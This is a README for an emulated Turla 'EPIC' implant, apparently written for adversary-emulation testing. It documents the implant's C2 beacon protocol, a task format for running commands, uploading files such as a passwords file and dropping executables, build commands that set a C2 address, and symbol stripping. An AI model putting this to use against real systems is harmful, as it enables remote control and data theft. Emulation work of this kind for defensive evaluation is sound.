# EPIC Payload

## C2 Communications
The EPIC payload communicates with a hardcoded C2 server and port value via HTTP POST requests.<sup>[1](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf)</sup>

### C2 Registration
The module will automatically perform initial discovery commands and output the results to a tmp
file in %TEMP% with a random string in its filename: `%TEMP%\~D<random>.tmp`.<sup>[1](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf)</sup>
For scenario purposes, this file name has been hardcoded to `%TEMP%\~D723574.tmp`. The discovery
output is returned in the POST request body.

The POST request body is bzip2 compressed and then formatted in a Base64 encoded JSON string with
fields `UUID`, `type`, and `data` and are not made to any particular subfolder and are sent to the
URL path `/` of the C2 server site. The initial heartbeat is structured as follows:
```
{"UUID":"", "type":"command", "data":"<system discovery information>"}
```

EPIC will use the `type` field to indicate to the C2 server what type of data to receive based on
the task.

| Type       | Description |
| ---------- | ------------
| `command`  | Associated with the `exe` key - indicates the returned data contains command output |
| `upload`   | Associated with the `result` key - indicates the returned data contains a file      |
| `download` | Associated with payloads and the `name` key - indicates download was successful     |
| `delete`   | Associated with the `name` and `del_task` keys - indicates delete was successful    |

Upon registration with the C2 server, the module will receive a UUID to use in future
communications. The module will then continue to perform POST requests to the domain name of the
C2 server site to receive instructions and return result output.

### Execute Commands
Upon receiving instructions to execute commands, the module will execute the command, append
command output to `%TEMP%\~D723574.tmp` , and return the command output in the next C2 communication
cycle.<sup>[1](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf)</sup>

## Execution
The Payload is intended to execute in the scenario as an embedded resource inside of EPIC's Reflective Guard, which is subsequently embedded in the Reflective Injector. Executing either the Guard DLL or Injector executable will result in the execution of the Payload DLL. To execute *just* the Payload, you can run it via `rundll32.exe` with the exported function `PayLoop`. See [here](../../#troubleshooting) if you encounter any issues.

### Tasks
The EPIC payload receives tasking from the C2 server as part of a successful beacon response.

To retrieve an instruction, the response should be base64 decoded and then bzip2 decompressed.

EPIC instructions are structured as followed:

| Instruction Section      | Byte Offset |
| ------------------------ | ----------- |
| Command ID               | 0           |
| Payload size (`p`)       | 4           |
| Payload                  | 8           |
| Configuration size       | 8 + `p`     |
| Configuration            | 8 + `p` + 4 |

Instructions with no payloads (EXE binaries) to download to the module will have a `Payload size`
of 0.

Configurations are INI structured files which contain some of the following fields:

| Name      | Description |
| --------- | ----------- |
| exe       | Execute a command, redirect its output to the file %TEMP%\~D%random%.tmp. The file is then uploaded during the next C&C communication cycle. |
| del_task  | Delete a file. |
| result    | Set the filename that is supposed to contain the results of command execution. Effectively, any existing file may be marked for upload by this command. |
| name      | Set the filename to be deleted or created (depends on other parameters) |

Example execute command configuration:

```
exe = whoami
```

Example upload file configuration:
```
result = C:\users\bob\passwords.txt
```

Example download file configuration (instruction should have associating payload data):
```
name = C:\System32\malicious.exe
```

Example delete file configuration:
```
del_task = \nname = C:\Windows\System32\malicious.exe
```

### Encryption

#### RSA encryption:
 - sha1 hash function
 - OAEP padding
 - 2048 bit key

```
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -outform PEM -pubout -out public.pem

openssl rsa -pubin -in public.pem -RSAPublicKey_out -out public_pkcs1.key -outform der
openssl rsa -in private.pem -traditional -out private_pkcs1.key -outform der
```
 
#### AES encryption:
  - 256 bit key
  - CBC mode of operation

## Build Instructions

**Notes about Bzip2**
The EPIC payload used a modified version of BZip2 compiled as a static library. Modifications to BZip2 primarily consisted of stripping debug statements throughout the source files. The modifed BZip2 static library has been removed from this repository, however vcpkg will install an unmodified BZip2 library upon building the payload that will function as needed.

If you are interested in downloading and modifying BZip2, you can find it [here](https://gitlab.com/bzip2/bzip2). CMake build instructions can be found [here](https://gitlab.com/bzip2/bzip2/-/blob/master/COMPILING.md#basic-release-build). Once compiled, `bz2_static.lib` should be copied to `payload\libs\lib\bzlib.lib` and the `bzlib.h` should be copied to `payload\libs\include\bzlib.h`. Create the relevant directories if they do not already exist. Please also make the necessary adjustments to the `CMakeLists.txt` and `vcpkg.json` files. <sup>[1](./vcpkg.json#L9) [2](./CMakeLists.txt#L27) [3](./CMakeLists.txt#L34) [4](./CMakeLists.txt#L64) [5](./CMakeLists.txt#L74)</sup>

**From Visual Studio Developer PowerShell:**

```
cd Resources\EPIC\payload
cmake -S . -B build -DUSE_HTTPS="<true/false>" -DC2_PORT="<port #>" -DC2_ADDRESS:STRING="<c2Address>" -DBINARY_NAME:STRING="<res/res2>"
cmake --build build --config Release --target ALL_BUILD -j 4 --
```

The compiled DLL and executable will be located in: `EPIC\payload\bin`

When built with the [build script](../#build-instructions), EPIC will use a default C2 server (address and port) and HTTP for communications. To compile with a different C2 server address and port or to use HTTPS communications, change the corresponding values in the line from above (`cmake -S . -B build -DUSE_HTTPS="<true/false>"...`). For example, to build the payload with C2 server `example.com`, port `1234`, and `HTTPS` selected, run:

```
cmake -S . -B build -DUSE_HTTPS="true" -DC2_PORT="1234" -DC2_ADDRESS:STRING="example.com" -DBINARY_NAME:STRING="res2"
```

Run the remaining command as written above. To note: the payload binary name `res` corresponds to HTTP and `res2` to HTTPS.


To remove symbols, you can use the `strip` command:
```
strip -s bin\test_res.exe
```

To verify, you can run `strings` or `objdump --syms bin\test_res.exe` - you should see an empty symbols table.

To run unit tests:

```
ctest --test-dir bin
```

## Cleanup Instructions

Remove the log file:
```
Remove-Item -Path "%TEMP%\~D723574.tmp";
```

Kill all Edge browsers potentially containing payload injected into it:
```
Get-Process msedge -ErrorAction SilentlyContinue | Stop-Process -Force;
```

## CTI References
1. https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf
2. https://securelist.com/the-epic-turla-operation/65545/
